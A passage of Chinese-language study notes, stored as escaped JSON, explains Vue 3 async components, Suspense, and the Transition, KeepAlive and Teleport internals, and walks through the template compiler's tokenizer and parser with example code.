(error.message.match(/fetch/)) {\n      retry()\n    } else {\n      fail()\n    }\n  }\n})\n</script>\n```\n\n## 3. 异步组件的加载状态处理\n\n### 3.1. 加载组件\n\n```vue\n<!-- LoadingComponent.vue -->\n<template>\n  <div class=\"loading-container\">\n    <div class=\"spinner\"></div>\n    <p>{{ loadingText }}</p>\n  </div>\n</template>\n\n<script setup>\nimport { ref } from 'vue'\n\nconst loadingText = ref('正在加载...')\n</script>\n\n<style scoped>\n.loading-container {\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n}\n\n.spinner {\n  /* 加载动画样式 */\n}\n</style>\n```\n\n### 3.2. 错误组件\n\n```vue\n<!-- ErrorComponent.vue -->\n<template>\n  <div class=\"error-container\">\n    <h3>{{ error?.message || '加载失败' }}</h3>\n    <button @click=\"handleRetry\">重试</button>\n  </div>\n</template>\n\n<script setup>\ndefineProps({\n  error: Error,\n  retry: Function\n})\n\nconst handleRetry = () => {\n  props.retry?.()\n}\n</script>\n```\n\n## 4. Suspense 的使用\n\n### 4.1. 基本用法\n\n```vue\n<template>\n  <Suspense>\n    <!-- 默认插槽 -->\n    <template `#default>`\n      <div>\n        <AsyncComponent1 />\n        <AsyncComponent2 />\n      </div>\n    </template>\n\n    <!-- 加载插槽 -->\n    <template `#fallback>`\n      <LoadingComponent />\n    </template>\n  </Suspense>\n</template>\n\n<script setup>\nimport { defineAsyncComponent } from 'vue'\n\nconst AsyncComponent1 = defineAsyncComponent(() => \n  import('./components/AsyncComponent1.vue')\n)\nconst AsyncComponent2 = defineAsyncComponent(() => \n  import('./components/AsyncComponent2.vue')\n)\n</script>\n```\n\n### 4.2. 异步组件嵌套\n\n```vue\n<!-- ParentComponent.vue -->\n<template>\n  <Suspense>\n    <template `#default>`\n      <div>\n        <h2>父组件</h2>\n        <AsyncChild />\n      </div>\n    </template>\n    <template `#fallback>`\n      <LoadingComponent />\n    </template>\n  </Suspense>\n</template>\n\n<script setup>\nimport { defineAsyncComponent } from 'vue'\n\nconst AsyncChild = defineAsyncComponent(() => \n  import('./ChildComponent.vue')\n)\n</script>\n\n<!-- ChildComponent.vue -->\n<script setup>\n// 模拟异步操作\nawait new Promise(resolve => setTimeout(resolve, 1000))\n\n// 组件逻辑\n</script>\n```\n\n## 5. 异步组件的数据获取\n\n### 5.1. 使用 async setup\n\n```vue\n<script setup>\nimport { ref } from 'vue'\n\nconst data = ref(null)\n\n// async setup\nconst loadData = async () => {\n  try {\n    const response = await fetch('https://api.example.com/data')\n    data.value = await response.json()\n  } catch (error) {\n    console.error('数据加载失败:', error)\n    throw error\n  }\n}\n\nawait loadData() // 直接在 setup 中使用 await\n</script>\n\n<template>\n  <div>\n    <h2>数据展示</h2>\n    <pre>{{ data }}</pre>\n  </div>\n</template>\n```\n\n### 5.2. 组合多个异步操作\n\n```vue\n<script setup>\nimport { ref } from 'vue'\n\nconst userData = ref(null)\nconst postsData = ref(null)\n\nconst loadUserData = async () => {\n  const response = await fetch('https://api.example.com/user')\n  userData.value = await response.json()\n}\n\nconst loadPosts = async () => {\n  const response = await fetch('https://api.example.com/posts')\n  postsData.value = await response.json()\n}\n\n// 并行加载数据\nawait Promise.all([\n  loadUserData(),\n  loadPosts()\n])\n</script>\n```\n\n## 6. 错误处理\n\n### 6.1. 自定义重试机制\n\n```vue\n<script setup>\nimport { defineAsyncComponent, ref } from 'vue'\n\nconst loadingError = ref(null)\nconst retryCount = ref(0)\n\nconst AsyncComp = defineAsyncComponent({\n  loader: () => import('./components/MyComponent.vue'),\n  onError(error, retry, fail) {\n    loadingError.value = error\n    retryCount.value++\n    \n    if (retryCount.value <= 3) {\n      // 自动重试\n      setTimeout(retry, 1000)\n    } else {\n      // 超过重试次数，显示错误\n      fail()\n    }\n  }\n})\n</script>\n\n<template>\n  <div>\n    <AsyncComp />\n    <div v-if=\"loadingError\">\n      错误信息: {{ loadingError.message }}\n    </div>\n  </div>\n</template>\n\n```\n\n### 6.2. 全局错误处理\n\n```vue hl:3\n<!-- App.vue -->\n<template>\n  <Suspense @pending=\"onPending\" @resolve=\"onResolve\" @fallback=\"onFallback\">\n    <template `#default>`\n      <AsyncComponent />\n    </template>\n    <template `#fallback>`\n      <LoadingComponent />\n    </template>\n  </Suspense>\n</template>\n\n<script setup>\nimport { onErrorCaptured } from 'vue'\n\n// 捕获异步组件错误\nonErrorCaptured((error, instance, info) => {\n  console.error('捕获到错误:', error)\n  // 返回 false 阻止错误继续传播\n  return false\n})\n\nconst onPending = () => {\n  console.log('组件加载中...')\n}\n\nconst onResolve = () => {\n  console.log('组件加载完成')\n}\n\nconst onFallback = () => {\n  console.log('显示 fallback 内容')\n}\n</script>\n```\n\n### 6.3. 组件级错误处理\n\n```vue\n<script setup>\nimport { ref, onErrorCaptured } from 'vue'\n\nconst error = ref(null)\n\nonErrorCaptured((err) => {\n  error.value = err\n  return false // 阻止错误继续传播\n})\n\n// 异步操作\nconst fetchData = async () => {\n  try {\n    const result = await someAsyncOperation()\n    return result\n  } catch (err) {\n    error.value = err\n    throw err\n  }\n}\n</script>\n```\n\n## 7. 性能优化\n\n### 7.1. 组件预加载\n\n```vue hl:11\n<script setup>\nimport { defineAsyncComponent, onMounted } from 'vue'\n\n// 定义异步组件\nconst HeavyComponent = defineAsyncComponent(() => \n  import('./HeavyComponent.vue')\n)\n\n// 预加载组件\nonMounted(() => {\n  // 在适当的时机预加载\n  const preloadComponent = () => {\n    import('./HeavyComponent.vue')\n  }\n  \n  // 例如：用户悬停时预加载\n  document.addEventListener('mouseover', preloadComponent, { once: true })\n})\n</script>\n```\n\n### 7.2. 代码分割优化\n\n```vue hl:2\n<script setup>\n// 按需加载不同版本的组件\nconst DesktopComponent = defineAsyncComponent(() => \n  import('./DesktopComponent.vue')\n)\n\nconst MobileComponent = defineAsyncComponent(() => \n  import('./MobileComponent.vue')\n)\n\nconst isMobile = ref(false)\n\n// 根据条件动态选择组件\nconst DynamicComponent = computed(() => \n  isMobile.value ? MobileComponent : DesktopComponent\n)\n</script>\n```\n\n## 8. 实际应用示例\n\n### 8.1. 路由级异步组件\n\n```javascript hl:12\n// router.js\nimport { createRouter } from 'vue-router'\n\nconst router = createRouter({\n  routes: [\n    {\n      path: '/dashboard',\n      component: () => import('./views/Dashboard.vue'),\n      children: [\n        {\n          path: 'analytics',\n          component: () => import('./views/Analytics.vue')\n        }\n      ]\n    }\n  ]\n})\n```\n\n### 8.2. 全局异步组件注册\n\n```html hl:4\n<script setup>\nimport { defineAsyncComponent, provide } from 'vue'\n\n// 全局异步组件注册\nprovide('asyncComponents', {\n  'heavy-chart': defineAsyncComponent(() =>\n    import('./components/HeavyChart.vue')\n  ),\n  'data-grid': defineAsyncComponent(() =>\n    import('./components/DataGrid.vue')\n  )\n})\n</script>\n\n```\n\n### 8.3. 带缓存的异步数据加载\n\n```vue hl:4\n<script setup>\nimport { ref, provide } from 'vue'\n\nconst cache = new Map()\n\nconst loadData = async (id) => {\n  if (cache.has(id)) {\n    return cache.get(id)\n  }\n\n  const data = await fetch(`https://api.example.com/data/${id}`)\n  const result = await data.json()\n  cache.set(id, result)\n  return result\n}\n\n// 提供给子组件使用\nprovide('loadData', loadData)\n</script>\n```\n","skakTyRx":"\n# Vue3 中 Transition 组件的实现原理\n\n`#vue` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 动效事件\n\t- `transitionend` ：监听 CSS transition 完成的事件\n\t- `transitioncancel` ：监听 CSS transition 取消的事件\n- 每一帧的处理逻辑\n\t- JavaScript → Style → Layout → Paint → Composite\n- 两次 `requestAnimationFrame`？\n\t- 第一帧用于应用改变\n\t- 第二帧用于安全地读取更新后的值\n- ==Transition 组件==的**核心原理**是：\n\t- 当 DOM 元素被`挂载时`\n\t\t- 将**动效**附加到该 DOM 元素上；\n\t- 当 DOM 元素被`卸载时`\n\t\t- 不要立即卸载 DOM 元素，而是等到附加到该 DOM 元素上的**动效执行完成后**再卸载它\n\n## 2. 核心原理\n\nTransition 组件的实现比想象中简单得多，它的**核心原理**是：\n- 当 DOM 元素被`挂载时`\n\t- 将**动效**附加到该 DOM 元素上； \n- 当 DOM 元素被`卸载时`\n\t- 不要立即卸载 DOM 元素，而是等到附加到该 DOM 元素上的**动效执行完成后**再卸载它。\n\n## 3. 原生 DOM 的过渡实现原理\n\n简单说就是，如果使用 JS 为 DOM 元素添加进场和离场的动效。\n\n![|720](https://832-1310531898.cos.ap-beijing.myqcloud.com/545fb51c3790dac61166a5a7ae72d606.png)\n\n但上面的代码，我们执行会发现不符合预期，这是因为都是`当前帧`绘制了，下面的代码就符合预期\n\n![|672](https://832-1310531898.cos.ap-beijing.myqcloud.com/b34413de3d3674ef0ce3ec8b64afda80.png)\n\n \n\n### 3.1. 为什么 `requestAnimationFrame` 要嵌套两次？\n\n```javascript\n// 一帧的处理流程\nJavaScript → Style → Layout → Paint → Composite\n\n// 第一帧\nrAF(() => {\n  // 在这里修改 DOM\n  element.style.width = '100px'\n  // 这些修改会在当前帧末尾应用\n})\n\n// 第二帧\nrAF(() => {\n  // 这时 DOM 已经更新完成\n  // 可以安全地读取新的 DOM 状态\n})\n\n总结：\n1. 双重 rAF 确保 DOM 更新完成后再读取\n2. 第一帧用于应用改变\n3. 第二帧用于安全地读取更新后的值\n4. 主要用于需要精确测量 DOM 变化的场景\n5. 在简单的动画或不需要测量的场景下，单次 rAF 就足够了\n```\n\n\n最后 通过监听元素的 `transitionend 事件`来完成收尾工作，如下：\n\n![|720](https://832-1310531898.cos.ap-beijing.myqcloud.com/c533b909a9f09e46fb8c4e81251ae13c.png)\n\n所以总结下就是三个阶段：\n\n- beforeEnter 阶段：\n\t- 添加 enter-from 和 enter-active 类。 \n- enter 阶段：\n\t- 在下一帧中移除 enter-from 类，添加 enter-to。 \n- 进场动效结束：\n\t- 移除 enter-to 和 enter-active 类\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/6411de1206e237b995eb09b237262567.png)\n\n## 4. 最终代码，再封装\n\n```html\n<head>\n<style>\n.box {\n  width: 100px;\n  height: 100px;\n  background-color: red;\n}\n\n.enter-active, .leave-active {\n  transition: transform 1s ease-in-out;\n}\n.enter-from, .leave-to {\n  transform: translateX(200px);\n}\n.enter-to, .leave-from {\n  transform: translateX(0);\n}\n</style>\n\n</head>\n\n<body>\n\n<div id=\"app\"></div>\n\n<script>\n\nconst container = document.querySelector('#app')\n\nconst el = document.createElement('div')\nel.classList.add('box')\n\n// before enter\nel.classList.add('enter-from')\nel.classList.add('enter-active')\n\ncontainer.appendChild(el)\n// enter\nnextFrame(() => {\n  el.classList.remove('enter-from')\n  el.classList.add('enter-to')\n\n  el.addEventListener('transitionend', () => {\n    el.classList.remove('enter-to')\n    el.classList.remove('enter-active')\n  })\n})\n\n\nfunction nextFrame(cb) {\n  requestAnimationFrame(() => {\n    requestAnimationFrame(cb)\n  })\n}\n\nel.addEventListener('click', () => {\n  const performRemove = () => el.parentNode.removeChild(el)\n  el.classList.add('leave-from')\n  el.classList.add('leave-active')\n\n  // document.body.offsetHeight\n\n  nextFrame(() => {\n    el.classList.remove('leave-from')\n    el.classList.add('leave-to')\n\n    el.addEventListener('transitionend', () => {\n      el.classList.remove('leave-to')\n      el.classList.remove('leave-active')\n\n      performRemove()\n    })\n  })\n})\n\n</script>\n\n</body>\n\n```\n\n>  注：`nextFrame` 的实现有两个 `requestAnimationFrame` 嵌套\n\n## 5. Transition 组件的实现原理\n\n更多参考流程图：\n\n[https://www.figma.com/file/yadsH3JL06697MH3uWxPXd/2023.06.LOG?type=whiteboard&node-id=20-77&t=h8yXeRi9xblhKVhW-4](https://www.figma.com/file/yadsH3JL06697MH3uWxPXd/2023.06.LOG?type=whiteboard&node-id=20-77&t=h8yXeRi9xblhKVhW-4)\n\n### 5.1. 总结\n\nTransition 组件的实现原理：\n- 我们将过渡相关的钩子函数定义到虚拟节点的 `vnode.transition对象`中。\n- 渲染器在执行`挂载和卸载`操作时，会优先检查该虚拟节点是否需要进行过渡，\n- 如果需要， 则会在`合适的时机`执行 `vnode.transition 对象`中定义的过渡相关钩子函数。\n\t- 这些钩子函数主要是添加一些动画信息\n\n> 更形象的参考流程图\n\n## 6. 附：`transitionend` 事件介绍\n\n- `transitionend` 是一个监听 CSS transition 完成的事件\n- `transitioncancel`\n\n### 6.1. 基本用法\n\n```javascript\nelement.addEventListener('transitionend', (event) => {\n    // transition 结束时触发\n    console.log('过渡完成');\n    console.log('属性名:', event.propertyName);\n    console.log('过渡时长:', event.elapsedTime);\n});\n```\n\n### 6.2. 事件属性\n\n```javascript\n// transitionend 事件对象包含以下重要属性：\n{\n    propertyName: 'transform',  // 发生过渡的 CSS 属性名\n    elapsedTime: 1.5,          // 过渡持续时间（秒）\n    pseudoElement: '',         // 触发过渡的伪元素\n    target: element           // 触发过渡的元素\n}\n```\n\n### 6.3. 使用场景\n\n#### 6.3.1. 基础动画完成检测\n\n```javascript\nconst box = document.querySelector('.box');\n\nbox.addEventListener('transitionend', () => {\n    // 动画完成后执行\n    box.classList.add('animation-completed');\n});\n\n// 触发动画\nbox.classList.add('animate');\n```\n\n#### 6.3.2. 多属性过渡\n\n```javascript\n// CSS\n.box {\n    transition: width 0.3s, height 0.5s, background-color 1s;\n}\n\n// JavaScript\nlet completedTransitions = 0;\nelement.addEventListener('transitionend', (e) => {\n    completedTransitions++;\n    \n    // 所有过渡都完成时\n    if (completedTransitions === 3) {\n        console.log('所有过渡都完成了');\n        completedTransitions = 0;\n    }\n});\n```\n\n#### 6.3.3. 链式动画\n\n```javascript\nconst element = document.querySelector('.element');\n\nelement.addEventListener('transitionend', function(e) {\n    if (e.propertyName === 'width') {\n        // 宽度过渡完成后开始高度过渡\n        this.style.height = '200px';\n    } else if (e.propertyName === 'height') {\n        // 高度过渡完成后改变颜色\n        this.style.backgroundColor = 'blue';\n    }\n});\n\n// 开始第一个过渡\nelement.style.width = '300px';\n```\n\n### 6.4. 注意事项\n\n#### 6.4.1. 过渡被中断\n\n```javascript\n// 过渡中断时不会触发 transitionend\nelement.addEventListener('transitionend', () => {\n    console.log('可能不会执行');\n});\n\nelement.style.width = '200px';\n// 立即改变其他属性会中断过渡\nsetTimeout(() => {\n    element.style.display = 'none';\n}, 100);\n```\n\n#### 6.4.2. 使用 transitioncancel\n\n```javascript\n// 监听过渡取消事件\nelement.addEventListener('transitioncancel', () => {\n    console.log('过渡被取消');\n});\n```\n\n#### 6.4.3. 零时长过渡\n\n```javascript\n// 过渡时间为 0 时不会触发 transitionend\n.instant {\n    transition: width 0s;\n}\n```\n\n### 6.5. 完整示例\n\n```html\n<style>\n.box {\n    width: 100px;\n    height: 100px;\n    background: red;\n    transition: all 0.3s ease;\n}\n\n.box.active {\n    width: 200px;\n    height: 200px;\n    background: blue;\n}\n</style>\n\n<div class=\"box\"></div>\n\n<script>\nconst box = document.querySelector('.box');\nlet isAnimating = false;\n\nbox.addEventListener('transitionend', (e) => {\n    console.log(`${e.propertyName} 过渡完成`);\n    isAnimating = false;\n});\n\nbox.addEventListener('click', () => {\n    if (!isAnimating) {\n        isAnimating = true;\n        box.classList.toggle('active');\n    }\n});\n</script>\n```\n\n### 6.6. 兼容性检查\n\n```javascript\nfunction supportsTransitionEnd() {\n    const style = document.createElement('div').style;\n    return 'transition' in style ||\n           'WebkitTransition' in style ||\n           'MozTransition' in style;\n}\n\nif (supportsTransitionEnd()) {\n    // 支持 transition\n} else {\n    // 降级处理\n}\n```","3nF160Hc":"\n# Vue3 中 keepAlive组件的实现原理\n\n\n`#vue` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- keepalive ，==避免频繁地销毁、创建DOM 节点==\n\t- 保活，避免`冷启动`\n- KeepAlive 的原理\n\t- 当被 KeepAlive 的组件“卸载”时，渲染器并不会真的将其卸载掉，而是会将该组件搬运到一个==隐藏容器==中，从而使得组件可以维持当前状态。\n\t- 当被 KeepAlive 的组件“挂载”时，渲染器也不会真的挂载它，而是将它从==隐藏容器== `搬运`到原容器\n- KeepAlive 的其他能力，如==匹配策略和缓存策略==。\n\t- 比如 \n\t\t- include exclude \n\t\t- max 最多可以缓存多少组件实例\n\t- 对于==缓存策略==，Vue.js 默认采用==最新一次访问==\n\n## 2. 为什么需要 keepalive\n\n类似于HTTP 中的 `keepAlive` , 为了避免频繁地销毁、创建 HTTP 连接会带来额外 的性能开销；故允许多个请求或响应共用一个 TCP 连接\n\n同样的， `keepAlive组件` 可以避免一个组件被频繁地销毁/重建\n\n## 3. KeepAlive 的定义\n\n```typescript\ninterface KeepAliveProps {\n  /**\n   * 如果指定，则只有与 `include` 名称\n   * 匹配的组件才会被缓存。\n   */\n  include?: MatchPattern\n  /**\n   * 任何名称与 `exclude`\n   * 匹配的组件都不会被缓存。\n   */\n  exclude?: MatchPattern\n  /**\n   * 最多可以缓存多少组件实例。\n   */\n  max?: number | string\n}\n\ntype MatchPattern = string | RegExp | (string | RegExp)[]\n```\n\n## 4. KeepAlive 的本质\n\n它的功能是在多个组件间动态切换时缓存被移除的组件实例\n\n**本质是缓存管理，再加上特殊的挂载/卸载逻辑**\n\n具体如下图：\n\n![图片&文件](./files/20241104-13.png)\n\n## 5. 具体的代码架子\n\n![|784](https://832-1310531898.cos.ap-beijing.myqcloud.com/13dc59a8d535136931adcb1d8e17fa18.png)\n\n>  当然，比如卸载时，需要看这个组件是否是`内部组件`，是的话会对特殊处理。\n\n下面是 `move` 的一些具体逻辑：\n\n![|816](https://832-1310531898.cos.ap-beijing.myqcloud.com/6dc62342e395740c11f4a21257e00a46.png)\n\n## 6. include 和 exclude\n\n即能够显示的配置应该 被缓存的组件或不应该缓存的组件，**本质是通过内部组件的名称进行正则匹配，如果匹配到则直接渲染“内部组件”，不对其进行后续的缓存操作**\n\n## 7. 缓存管理\n\n总结下就是：\n\n- 如果缓存存在，则继承组件实例，并将用于描述`组件的 vnode 对象`标记为 `keptAlive`，这样渲染器就不会重新创建新的组件实例； \n- 如果缓存不存在，则设置缓存\n- 缓存策略：\n\t- 目前是`最近一次访问`\n\t- 另外还需要关注是否设置`最大缓存容量`，如果设置了，还需要`修剪`\n\n>  注1：缓存的是组件的实例\n\n## 8. 总结\n\n- KeepAlive 组件的作用类似于 HTTP 中的持久链接。它可以避免组件实例不断地被销毁和重建。\n- KeepAlive 的基本实现并不复杂。\n\t- 当被 KeepAlive 的组件“卸载”时，渲染器并不会真的将其卸载掉，而是会将该组件搬运到一个隐藏容器中，从而使得组件可以维持当前状态。\n\t- 当被 KeepAlive 的组件“挂载”时，渲染器也不会真的挂载它，而是将它从**隐藏容器**搬运到原容器。\n- KeepAlive 的其他能力，如匹配策略和缓存策略。\n\t- include 和 exclude 这两个选项用来指定哪些组件需要被 KeepAlive，哪些组件不需要被 KeepAlive。默认情况下，include 和 exclude 会匹配组件的 `name 选项`。但是在具体实现中，我们可以扩展匹配能力。\n\t- 对于==缓存策略==，Vue.js 默认采用“最新一次访问”。为了让用户能`自行实现缓存策略`\n\n> 具体代码见仓库，这里主要是列举了关键点\n\n","zr0lhk5U":"\n# Vue3中 Teleport 组件的实现原理\n\n`#vue` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 弹框场景就经常使用\n- 将 `Teleport 组件`的**渲染逻辑**从渲染器中分离出来，这么做有==两点好处==：\n\t- ==①== 可以**避免渲染器逻辑代码“膨胀”**\n\t- ==②== **方便TreeShaking**：\n\t\t- 当用户没有使用 `Teleport` 组件时，由于 `Teleport` 的渲染逻辑被分离\n\t\t- 因此可以利用 `TreeShaking` 机制在最终的 bundle 中删除 Teleport 相关的代码，使得最终构建包的体积变小\n\n## 2. 使用场景\n\n> 简单说就是，蒙层 `z-index` 的问题，所以必须渲染到 `body` 或者挂载到父元素上才行，vue3 本身提供内部组件来支持这个功能\n\n## 3. 定义\n\n```typescript\ninterface TeleportProps {\n  /**\n   * 必填项。指定目标容器。\n   * 可以是选择器或实际元素。\n   */\n  to: string | HTMLElement\n  /**\n   * 当值为 `true` 时，内容将保留在其原始位置\n   * 而不是移动到目标容器中。\n   * 可以动态更改。\n   */\n  disabled?: boolean\n  /**\n   * 当值为 `true` 时，Teleport 将推迟\n   * 直到应用的其他部分挂载后\n   * 再解析其目标。(3.5+)\n   */\n  defer?: boolean\n}\n```\n\n## 4. 实现渲染逻辑分离\n\n将 Teleport 组件的**渲染逻辑**从渲染器中分离出来，这么做有两点好处：\n\n- 可以**避免渲染器逻辑代码“膨胀”**； \n- **方便TreeShaking**：\n\t- 当用户没有使用 Teleport 组件时，由于 `Teleport` 的渲染逻辑被分离，因此可以利用 `TreeShaking` 机制在最终的 bundle 中删除 Teleport 相关的代码，使得最终构建包的体积变小\n\n下面是 patch 函数：\n\n![|608](https://832-1310531898.cos.ap-beijing.myqcloud.com/157ea664c2294a84c81ee0dba0120952.png)\n\n## 5. 以下面模板为示例\n\n![|472](https://832-1310531898.cos.ap-beijing.myqcloud.com/43dac0ddd96491945eff4ff8a1f2770c.png)\n\n所以具体对应的 vdom 如下：\n\n![|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/f25fb6a62f4fc44e773d798c7cc4227b.png)\n\n## 6. 最终代码\n\n```javascript\nconst Teleport = {\n  __isTeleport: true,\n  process(n1, n2, container, anchor, internals) {\n    const { patch, patchChildren, move } = internals\n    if (!n1) {\n      // 挂载\n        // 使用 to属性 去查找 DOM 节点\n      const target = typeof n2.props.to === 'string'\n        ? document.querySelector(n2.props.to)\n        : n2.props.to\n      n2.children.forEach(c => patch(null, c, target, anchor))\n    } else {\n      // 更新\n      patchChildren(n1, n2, container)\n      if (n2.props.to !== n1.props.to) {\n          // :::: 使用 to属性 去查找 DOM 节点\n        const newTarget = typeof n2.props.to === 'string'\n          ? document.querySelector(n2.props.to)\n          : n2.props.to\n        n2.children.forEach(c => move(c, newTarget))\n      }\n    }\n  }\n}\n```\n\n## 7. 最后\n\n看看 `Teleport` 单词含义：\n\nv. 心灵运输（物体、人）；远距离传送\nn. 通信卫星；心灵传输\n\n**即，Teleport组件 将模板渲染到其他节点下，即跨越 DOM 层级渲染**\n","9Ev681TY":"\n# Vue3 的编译器原理（篇一：基本实现）\n\n`#vue` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- `tokenize(HTML字符串)` →  `list` →  模板 AST ==树形结构== →   \n\t- → 遍历多叉树（插件化架构），主要两个时机，进入和离开，两个时机分别再 `return` 一个函数\n\t\t- 然后就可以生成 `JS AST` \n\t\t\t- 然后再根据 `JS AST` 生成 ==渲染函数==\n\n## 1. 教科书式的编译模型\n\n**编译器其实只是一段程序**，它用来将“一种语言 A” `翻译成` “另外一种语言 B”。\n\n完整的编译流程如下：\n\n![|920](https://832-1310531898.cos.ap-beijing.myqcloud.com/bb7817fb1a517ee8ae5e63730360bf57.png)\n\n## 2. Vue.js 模板编译器\n\n教科书式的编译模型如上，但 `Vue 模板`有所不同，\n\n`Vue.js 的模板`和 `JSX` 都属于 `领域特定语言(DSL)` ，`Vue.js 模板编译器`的作用如下图\n\n![图片&文件](./files/20241104-14.png)\n\n- 源码是：`.vue 模板`\n- 目标代码：`可执行的渲染函数`\n\n### 2.1. Vue.js 模板编译为渲染函数的完整流程\n\n![|792](https://832-1310531898.cos.ap-beijing.myqcloud.com/ded1464ed79b825a24b24e148fed06c6.png)\n\n> 其中，`str` 即为 `.vue文件`的内容\n\n分开说，分为一下几部分：\n - 用来将模板字符串解析为`模板 AST` 的解析器(parser);\n - 用来将`模板 AST` 转换为 JavaScript AST 的转换器 (transformer);\n - 用来根据 `JavaScript AST` 生成渲染函数代码的生成器 (generator)\n\n### 2.2. 模板 生成 模板AST\n\n![图片&文件](./files/20241104-16.png)\n\n### 2.3. 模板AST 生成 `JS AST 转换器`\n\n因为 Vue.js 模板编译器的`最终目标`是生成渲染函数，而渲染函数`本质`上是 JavaScript 代码，所以我们需要将`模板 AST` 转换成`用于描述渲染函数的 JavaScript AST`\n\n所以`JS AST 转换器` 是 `用于描述渲染函数的 JavaScript AST`\n\n### 2.4. jsAST 生成最终可执行的 **渲染函数**\n\n![图片&文件](./files/20241104-17.png)\n\n## 3. Vue3 的模板编译器实现原理\n\n### 3.1. 如何用`有限状态自动机`构造一个`词法分析器`\n\n![图片&文件](./files/20241104-18.png)\n\n按照`有限状态自动机的状态迁移过程`，我们可以很容易地编写对应的代码实现。\n\n因此，**有限状态自动机**可以帮助我们完成**对模板的 (tokenized)**，最终我们将得到一系列 Token 列表，具体代码如下：\n\n```javascript\nconst template = `<p>Vue</p>`;\n\n// 定义状态机的状态\nconst State = {\n  initial: 1,\n  tagOpen: 2,\n  tagName: 3,\n  text: 4,\n  tagEnd: 5,\n  tagEndName: 6,\n};\n\n// 判断是否是字母\nfunction isAlpha(char) {\n  return (char >= \"a\" && char <= \"z\") || (char >= \"A\" && char <= \"Z\");\n}\n\nfunction tokenize(str) {\n  // 初始化状态\n  let currentState = State.initial;\n  // 用于存放字符\n  const chars = [];\n  // 用于存放token\n  const tokens = [];\n  while (str) {\n    const char = str[0];\n    switch (currentState) {\n      case State.initial:\n        if (char === \"<\") {\n          currentState = State.tagOpen;\n          str = str.slice(1);\n        } else if (isAlpha(char)) {\n          currentState = State.text;\n          chars.push(char);\n          str = str.slice(1);\n        }\n        break;\n      case State.tagOpen:\n        if (isAlpha(char)) {\n          currentState = State.tagName;\n          chars.push(char);\n          str = str.slice(1);\n        } else if (char === \"/\") {\n          currentState = State.tagEnd;\n          str = str.slice(1);\n        }\n        break;\n      case State.tagName:\n        if (isAlpha(char)) {\n          chars.push(char);\n          str = str.slice(1);\n        } else if (char === \">\") {\n          currentState = State.initial;\n          tokens.push({\n            type: \"tag\",\n            name: chars.join(\"\"),\n          });\n          chars.length = 0;\n          str = str.slice(1);\n        }\n        break;\n      case State.text:\n        if (isAlpha(char)) {\n          chars.push(char);\n          str = str.slice(1);\n        } else if (char === \"<\") {\n          currentState = State.tagOpen;\n          tokens.push({\n            type: \"text\",\n            content: chars.join(\"\"),\n          });\n          chars.length = 0;\n          str = str.slice(1);\n        }\n        break;\n      case State.tagEnd:\n        if (isAlpha(char)) {\n          currentState = State.tagEndName;\n          chars.push(char);\n          str = str.slice(1);\n        }\n        break;\n      case State.tagEndName:\n        if (isAlpha(char)) {\n          chars.push(char);\n          str = str.slice(1);\n        } else if (char === \">\") {\n          currentState = State.initial;\n          tokens.push({\n            type: \"tagEnd\",\n            name: chars.join(\"\"),\n          });\n          chars.length = 0;\n          str = str.slice(1);\n        }\n        break;\n    }\n  }\n\n  // 返回token\n  return tokens;\n}\n\nconsole.log(tokenize(template));\n\n[\n    {\n        \"type\": \"tag\",\n        \"name\": \"p\"\n    },\n    {\n        \"type\": \"text\",\n        \"content\": \"Vue\"\n    },\n    {\n        \"type\": \"tagEnd\",\n        \"name\": \"p\"\n    }\n]\n```\n\n> [!tip]\n> 也可以使用正则表达式，因为`编写正则表达式`本质就是`编写有限自动机`；但通过这种方式来实现更能说明什么是有限状态自动机\n\n词法分析的过程就是状态机在不同状态之间迁移的过程。在此过程中，状态机会产生一个个 Token，形成一个 **Token 列表**\n\n#### 3.1.1. 示例\n\n `tokenize(<div><p>Vue</p><p>Template</p></div>)` , 可得到如下结果：\n\n```json\n[\n    {\n        \"type\": \"tag\",\n        \"name\": \"div\"\n    },\n    {\n        \"type\": \"tag\",\n        \"name\": \"p\"\n    },\n    {\n        \"type\": \"text\",\n        \"content\": \"Vue\"\n    },\n    {\n        \"type\": \"tagEnd\",\n        \"name\": \"p\"\n    },\n    {\n        \"type\": \"tag\",\n        \"name\": \"p\"\n    },\n    {\n        \"type\": \"text\",\n        \"content\": \"Template\"\n    },\n    {\n        \"type\": \"tagEnd\",\n        \"name\": \"p\"\n    },\n    {\n        \"type\": \"tagEnd\",\n        \"name\": \"div\"\n    }\n]\n```\n\n>  词法分析的过程就是，状态机在不同状态之间的迁移过程\n\n### 3.2. 将上面构造出的 token 列表构造成`树形模板AST`\n\n实现一个 `parse` 函数，即将 `上面的token 列表`输出为如下`树结构`，如下结构就是 `AST` 或者说是 `Vnode`\n\n![图片&文件](./files/20241104-19.png)\n\n```json\n{\n    \"type\": \"Root\",\n    \"children\": [\n        {\n            \"type\": \"Element\",\n            \"tag\": \"div\",\n            \"children\": [\n                {\n                    \"type\": \"Element\",\n                    \"tag\": \"p\",\n                    \"children\": [\n                        {\n                            \"type\": \"Text\",\n                            \"content\": \"Vue\"\n                        }\n                    ]\n                },\n                {\n                    \"type\": \"Element\",\n                    \"tag\": \"p\",\n                    \"children\": [\n                        {\n                            \"type\": \"Text\",\n                            \"content\": \"Template\"\n                        }\n                    ]\n                }\n            ]\n        }\n    ]\n}\n```\n\n扫描 Token 列表并维护一个开始标签`栈`。\n- 每当扫描到一个`开始标签`节点，就将其压入栈顶。\n- 栈顶的节点始终作为下一个扫描的节点的父节点。\n- 这样，当所有 Token 扫描完毕后，即可构建出一棵树型 AST\n\n具体代码如下：\n\n```javascript\nconst template = `<div><p>Vue</p><p>Template</p></div>`;\nfunction parse(str) {\n  const tokens = tokenize(str);\n  // 自定义一个根节点\n  const root = {\n    type: \"Root\",\n    children: [],\n  };\n  // 标签栈\n  const elementStack = [root];\n\n  while (tokens.length) {\n    const parent = elementStack[elementStack.length - 1];\n    const t = tokens[0];\n    switch (t.type) {\n      case \"tag\":\n        // 元素节点定义\n        const elementNode = {\n          type: \"Element\",\n          tag: t.name,\n          children: [],\n        };\n        parent.children.push(elementNode);\n        elementStack.push(elementNode);\n        break;\n      // 文本节点定义\n      case \"text\":\n        const textNode = {\n          type: \"Text\",\n          content: t.content,\n        };\n        parent.children.push(textNode);\n        break;\n      // 记得 pop   \n      case 